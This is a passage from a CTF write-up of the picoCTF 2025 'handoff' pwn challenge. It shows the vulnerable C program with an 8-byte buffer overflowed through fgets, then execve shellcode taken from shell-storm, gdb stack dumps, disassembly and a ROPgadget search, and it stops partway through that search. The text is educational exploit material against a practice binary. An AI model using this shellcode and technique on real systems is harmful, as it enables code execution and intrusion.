+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">	puts</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">What option would you like to do?</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">	puts</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">1. Add a new recipient</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">	puts</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">2. Send a message to a recipient</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">	puts</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">3. Exit the app</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">int</span><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> vuln</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">() {</span></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">	char</span><span style="color:#24292EFF;--shiki-dark:#C5E478"> feedback</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">[</span><span style="color:#1976D2;--shiki-dark:#F78C6C">8</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">];</span></span>
+<span class="line"><span style="color:#1976D2;--shiki-dark:#C5E478">	entry_t</span><span style="color:#24292EFF;--shiki-dark:#C5E478"> entries</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">[</span><span style="color:#1976D2;--shiki-dark:#F78C6C">10</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">];</span></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">	int</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> total_entries </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">	int</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> choice </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#D32F2F;--shiki-dark:#7FDBCA"> -</span><span style="color:#1976D2;--shiki-dark:#F78C6C">1</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">	// Have a menu that allows the user to write whatever they want to a set buffer elsewhere in memory</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">	while</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> (</span><span style="color:#1976D2;--shiki-dark:#82AAFF">true</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">) {</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">		print_menu</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">()</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">		if</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> (</span><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">scanf</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#1976D2;--shiki-dark:#82AAFF">%d</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#212121;--shiki-dark:#82AAFF">,</span><span style="color:#D32F2F;--shiki-dark:#7FDBCA"> &#x26;</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">choice)</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> !=</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 1</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">) </span><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">exit</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#1976D2;--shiki-dark:#F78C6C">0</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">		getchar</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">()</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"> // Remove trailing \n</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">		// Add entry</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">		if</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> (choice </span><span style="color:#D32F2F;--shiki-dark:#C792EA">==</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 1</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">) {</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">			choice </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#D32F2F;--shiki-dark:#7FDBCA"> -</span><span style="color:#1976D2;--shiki-dark:#F78C6C">1</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">			// Check for max entries</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">			if</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> (total_entries </span><span style="color:#D32F2F;--shiki-dark:#C792EA">>=</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> MAX_ENTRIES) {</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">				puts</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">Max recipients reached!</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">				continue</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">			}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">			// Add a new entry</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">			puts</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">What's the new recipient's name: </span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">			fflush</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(stdin)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">			fgets</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#6F42C1;--shiki-dark:#C5E478">entries</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">[total_entries]</span><span style="color:#212121;--shiki-dark:#82AAFF">.</span><span style="color:#6F42C1;--shiki-dark:#C5E478">name</span><span style="color:#212121;--shiki-dark:#82AAFF">,</span><span style="color:#6F42C1;--shiki-dark:#82AAFF"> NAME_LEN</span><span style="color:#212121;--shiki-dark:#82AAFF">,</span><span style="color:#6F42C1;--shiki-dark:#82AAFF"> stdin)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">			total_entries</span><span style="color:#D32F2F;--shiki-dark:#C792EA">++</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">			</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">		}</span></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">		// Add message</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">		else</span><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> if</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> (choice </span><span style="color:#D32F2F;--shiki-dark:#C792EA">==</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 2</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">) {</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">			choice </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#D32F2F;--shiki-dark:#7FDBCA"> -</span><span style="color:#1976D2;--shiki-dark:#F78C6C">1</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">			puts</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">Which recipient would you like to send a message to?</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">			if</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> (</span><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">scanf</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#1976D2;--shiki-dark:#82AAFF">%d</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#212121;--shiki-dark:#82AAFF">,</span><span style="color:#D32F2F;--shiki-dark:#7FDBCA"> &#x26;</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">choice)</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> !=</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 1</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">) </span><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">exit</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#1976D2;--shiki-dark:#F78C6C">0</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">			getchar</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">()</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">			if</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> (choice </span><span style="color:#D32F2F;--shiki-dark:#C792EA">>=</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> total_entries) {</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">				puts</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">Invalid entry number</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">				continue</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">			}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">			puts</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">What message would you like to send them?</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">			fgets</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#6F42C1;--shiki-dark:#C5E478">entries</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">[choice]</span><span style="color:#212121;--shiki-dark:#82AAFF">.</span><span style="color:#6F42C1;--shiki-dark:#C5E478">msg</span><span style="color:#212121;--shiki-dark:#82AAFF">,</span><span style="color:#6F42C1;--shiki-dark:#82AAFF"> MSG_LEN</span><span style="color:#212121;--shiki-dark:#82AAFF">,</span><span style="color:#6F42C1;--shiki-dark:#82AAFF"> stdin)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">		}</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">		else</span><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> if</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> (choice </span><span style="color:#D32F2F;--shiki-dark:#C792EA">==</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 3</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">) {</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">			choice </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#D32F2F;--shiki-dark:#7FDBCA"> -</span><span style="color:#1976D2;--shiki-dark:#F78C6C">1</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">			puts</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: </span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">			fgets</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(feedback</span><span style="color:#212121;--shiki-dark:#82AAFF">,</span><span style="color:#6F42C1;--shiki-dark:#82AAFF"> NAME_LEN</span><span style="color:#212121;--shiki-dark:#82AAFF">,</span><span style="color:#6F42C1;--shiki-dark:#82AAFF"> stdin)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#C5E478">			feedback</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">[</span><span style="color:#1976D2;--shiki-dark:#F78C6C">7</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">] </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#22863A;--shiki-dark:#D9F5DD"> '</span><span style="color:#22863A;--shiki-dark:#F78C6C">\0</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">			break</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">		}</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">		else</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">			choice </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#D32F2F;--shiki-dark:#7FDBCA"> -</span><span style="color:#1976D2;--shiki-dark:#F78C6C">1</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">			puts</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">Invalid option</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">		}</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">	}</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D32F2F;--shiki-dark:#C792EA">int</span><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> main</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">() {</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">	setvbuf</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">(stdout</span><span style="color:#212121;--shiki-dark:#82AAFF">,</span><span style="color:#1976D2;--shiki-dark:#82AAFF"> NULL</span><span style="color:#212121;--shiki-dark:#82AAFF">,</span><span style="color:#6F42C1;--shiki-dark:#82AAFF"> _IONBF</span><span style="color:#212121;--shiki-dark:#82AAFF">,</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">)</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">  // No buffering (immediate output)</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">	vuln</span><span style="color:#6F42C1;--shiki-dark:#82AAFF">()</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">	return</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">}</span></span></code></pre>
+<p>The program does the following:</p>
+<ul>
+<li>Prints a menu with three options and asks the user for input.</li>
+<li>Allows the user to:
+<ol>
+<li>Add a new recipient by providing a name (stored in the <code>entries</code> array).</li>
+<li>Send a message to a recipient by selecting an index and providing a message (stored in the <code>entries</code> array).</li>
+<li>Exit the program and provide feedback (stored in the <code>feedback</code> array).</li>
+</ol>
+</li>
+<li>Contains a <strong>buffer overflow vulnerability</strong>:
+<ul>
+<li>The <code>feedback</code> array is only 8 bytes, but the program reads up to 32 bytes of input using <code>fgets(feedback, NAME_LEN, stdin)</code>.</li>
+</ul>
+</li>
+<li>Exits the program after collecting feedback or if invalid input is provided.</li>
+</ul>
+<p>Since there is no <code>win</code> function present in the source code we will likely need a shell.</p>
+<h3 id="shellcode-injection">Shellcode Injection</h3>
+<p>Since NX is disabled, we can make the program execute shellcode off the stack. Looking on shell-storm I found the following shellcode that we can use for this program.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#24292EFF;--shiki-dark:#D6DEEB">shellcode </span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#D32F2F;--shiki-dark:#C792EA"> b</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span><span style="color:#22863A;--shiki-dark:#F78C6C">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span style="color:#22863A;--shiki-dark:#D9F5DD">'</span></span></code></pre>
+<p>We can input these bytes to the <code>msg</code> char array in the <code>entry_t</code> struct as it allows 64 bytes of input.
+Now, we need to figure out a way can make execution jump to the location of the <code>msg</code> char array on the stack.</p>
+<h3 id="stack-inspection">Stack Inspection</h3>
+<p>We can use gdb to inspect the stack right after we input into the <code>feedback</code> buffer.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>└─$ gdb handoff</span></span>
+<span class="line"><span>gef➤  b *vuln+452</span></span>
+<span class="line"><span>Breakpoint 1 at 0x4013ed</span></span>
+<span class="line"><span>gef➤  r</span></span>
+<span class="line"><span>Starting program: /home/vsingh/Downloads/CTF/picoCTF_2025/pwn/handoff/handoff </span></span>
+<span class="line"><span>[Thread debugging using libthread_db enabled]</span></span>
+<span class="line"><span>Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".</span></span>
+<span class="line"><span>What option would you like to do?</span></span>
+<span class="line"><span>1. Add a new recipient</span></span>
+<span class="line"><span>2. Send a message to a recipient</span></span>
+<span class="line"><span>3. Exit the app</span></span>
+<span class="line"><span>1</span></span>
+<span class="line"><span>What's the new recipient's name: </span></span>
+<span class="line"><span>AAAAAAAA</span></span>
+<span class="line"><span>What option would you like to do?</span></span>
+<span class="line"><span>4. Add a new recipient</span></span>
+<span class="line"><span>5. Send a message to a recipient</span></span>
+<span class="line"><span>6. Exit the app</span></span>
+<span class="line"><span>2</span></span>
+<span class="line"><span>Which recipient would you like to send a message to?</span></span>
+<span class="line"><span>0</span></span>
+<span class="line"><span>What message would you like to send them?</span></span>
+<span class="line"><span>BBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE</span></span>
+<span class="line"><span>What option would you like to do?</span></span>
+<span class="line"><span>7. Add a new recipient</span></span>
+<span class="line"><span>8. Send a message to a recipient</span></span>
+<span class="line"><span>9. Exit the app</span></span>
+<span class="line"><span>3</span></span>
+<span class="line"><span>Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: </span></span>
+<span class="line"><span>FFFF</span></span></code></pre>
+<p>After reaching the breakpoint, we can run</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>gef➤  x/100gx $rsp</span></span>
+<span class="line"><span>0x7fffffffd8d0:	0x646e61682f66666f	0x000000000066666f</span></span>
+<span class="line"><span>0x7fffffffd8e0:	0x4141414141414141	0x4242424242424242</span></span>
+<span class="line"><span>0x7fffffffd8f0:	0x4343434343434343	0x4444444444444444</span></span>
+<span class="line"><span>0x7fffffffd900:	0x4545454545454545	0x000000000000000a</span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span>0x7fffffffdbb0:	0x46464646ffffdbd0	0x000000010000000a</span></span>
+<span class="line"><span>0x7fffffffdbc0:	0x00007fffffffdbd0	0x000000000040143f</span></span>
+<span class="line"><span>0x7fffffffdbd0:	0x0000000000000001	0x00007ffff7dd5d68</span></span></code></pre>
+<p>Based on this information the <code>name</code> char array of the first entry starts at <code>0x7fffffffd8e0</code>, the <code>msg</code> char array of the first entry starts at <code>0x7fffffffd8e8</code>, and the <code>feedback</code> char array starts at <code>0x7fffffffdbb4</code>.
+Also, based on this following disassembly of the main function, it is clear that the value stored at <code>0x7fffffffdbc8</code> is the return address of the <code>vuln</code> function.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>000000000040140f &#x3C;main>:</span></span>
+<span class="line"><span>  40140f:	f3 0f 1e fa          	endbr64</span></span>
+<span class="line"><span>  401413:	55                   	push   %rbp</span></span>
+<span class="line"><span>  401414:	48 89 e5             	mov    %rsp,%rbp</span></span>
+<span class="line"><span>  401417:	48 8b 05 42 2c 00 00 	mov    0x2c42(%rip),%rax        # 404060 &#x3C;stdout@GLIBC_2.2.5></span></span>
+<span class="line"><span>  40141e:	b9 00 00 00 00       	mov    $0x0,%ecx</span></span>
+<span class="line"><span>  401423:	ba 02 00 00 00       	mov    $0x2,%edx</span></span>
+<span class="line"><span>  401428:	be 00 00 00 00       	mov    $0x0,%esi</span></span>
+<span class="line"><span>  40142d:	48 89 c7             	mov    %rax,%rdi</span></span>
+<span class="line"><span>  401430:	e8 ab fc ff ff       	call   4010e0 &#x3C;setvbuf@plt></span></span>
+<span class="line"><span>  401435:	b8 00 00 00 00       	mov    $0x0,%eax</span></span>
+<span class="line"><span>  40143a:	e8 ea fd ff ff       	call   401229 &#x3C;vuln></span></span>
+<span class="line"><span>  40143f:	b8 00 00 00 00       	mov    $0x0,%eax</span></span>
+<span class="line"><span>  401444:	5d                   	pop    %rbp</span></span>
+<span class="line"><span>  401445:	c3                   	ret</span></span>
+<span class="line"><span>  401446:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)</span></span>
+<span class="line"><span>  40144d:	00 00 00 </span></span></code></pre>
+<h3 id="jumping-to-shellcode">Jumping to Shellcode</h3>
+<p>Since ASLR (Address Space Layout Randomization) is enabled, we cannot overflow the feedback buffer and modify the return address to the address of the shellcode.</p>
+<p>We can try using a ROP gadget to perform this task.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>└─$ ROPgadget --binary=handoff | grep jmp</span></span>
+<span class="line"><span>0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020</span></span>
+<span class="line"><span>0x0000000000401038 : add dl, dh ; jmp 0x401020</span></span>
